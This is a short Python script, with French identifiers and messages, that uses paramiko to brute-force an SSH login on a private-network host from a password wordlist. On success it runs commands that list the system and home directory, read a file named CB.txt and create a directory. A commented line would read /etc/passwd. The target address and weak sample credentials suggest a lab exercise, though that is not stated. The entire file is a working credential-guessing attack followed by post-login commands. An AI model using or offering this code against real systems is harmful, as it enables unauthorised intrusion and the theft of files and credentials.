import paramiko

host="10.105.200.107"
username="userfaible"
password="azerty"


def ssh(username, password):
    pirate=False
    try:
        client=paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        pirate=True

    except Exception as err:
        print("err ", err)
    # finally:
    #     client.close()

    if pirate:
        # command="tail /etc/passwd"
        # command="head CB.txt"
        command="uname -ar && ls -lsa && head CB.txt && mkdir NKUMBE_AURELIEN"
        _stdin, _stout, _sterr = client.exec_command(command)
        print(_stout.read().decode())

    client.close()
    return pirate



def pirate(username, password_filename):
    file = open(password_filename, "r")
    lines = file.readlines()
    file.close()
    for line in lines:
        password = line.strip()
        if ssh(username, password):
            print("Mot de  pass correct ",line.strip())
            break
        else:
            print("Mot de  pass incorrect ",line.strip())

        # print(line.strip())


# ssh("bisous")


# pirate("userfailble", "password.txt")
pirate("camille", "password.txt")

